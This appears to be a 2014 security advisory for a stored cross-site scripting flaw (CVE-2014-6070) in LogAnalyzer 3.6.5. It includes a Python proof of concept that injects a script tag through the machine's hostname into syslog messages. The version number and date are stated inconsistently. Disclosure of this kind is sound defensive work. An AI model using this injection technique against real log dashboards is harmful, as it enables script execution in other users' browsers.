@@ -1,0 +1,51 @@
+Vulnerability title: Syslog LogAnalyzer 3.6.5 Stored XSS
+Author: Dolev Farhi
+Contact: dolevf at yahoo dot com  @dolevff
+Application: LogAnalyzer 3.6.5
+Date: 8.2.2014
+Relevant CVEs: CVE-2014-6070
+Vulnerable version: <= 3.6.5
+Fixed version: 3.6.6
+
+1. About the application
+------------------------
+LogAnalyzer is a web interface to syslog and other network event data. 
+It provides easy browsing, analysis of realtime network events and 
+reporting services.
+
+
+2. Vulnerabilities Descriptions:
+-----------------------------
+It was found that an XSS injection is possible on a syslog server 
+running LogAnalyzer version 3.6.5.
+by changing the hostname of any entity logging to syslog server with 
+LogAnalyzer to <script>alert("xss")</script>, and sending an arbitrary
+syslog message, a client-side script injection execution is possible.
+
+
+4. proof of concept exploit
+-----------------------
+#!/usr/bin/python
+# Exploit title = LogAnalyzer 3.5.6 Stored XSS injection
+# Date: Sept 2014
+# CVE: 2014-6070
+# Tested on RHEL6.4
+
+import os
+import syslog
+
+hostname = os.uname()[1]
+payload = "\"<script>alert('XSS');</script>\""
+
+print("+ Setting temporary hostname to " + payload + "...")
+os.system("hostname " +  payload)
+
+print("+ Injecting the syslog message...")
+syslog.syslog("syslog xss injection")
+
+print("+ Check LogAnalyzer dashboard...")
+
+raw_input("+ Press [enter] to restore hostname...")
+os.system("hostname " + "\""  +  hostname + "\"")
+
+print("+ Hostname restored to " + hostname)
